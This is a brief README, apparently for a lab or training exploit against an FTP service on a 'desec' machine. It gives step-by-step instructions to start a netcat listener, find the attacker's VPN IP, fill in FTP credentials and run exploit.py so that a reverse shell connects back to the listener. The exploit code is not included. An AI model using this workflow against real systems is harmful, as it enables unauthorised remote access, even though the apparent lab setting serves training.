# How to run?

first of all, setup your netcat to listen a port `8080` for example:

```shell
nc -nlvp 8080
```

now, check what is your ip with

```shell
ifconfig tun0 | grep "inet " | cut -d ' ' -f10
```

now, you go to the exploit and change

```py
FTP_USER = 'USER'       # CHANGE THIS !!!
FTP_PASS = 'PASS'       # CHANGE THIS !!!
```

to the right ftp user and password

now, run the exploit:

```shell
chmod u+x ./exploit.py
```

```shell
./exploit.py <desec-machine-ip> <your-ip> 8080
```
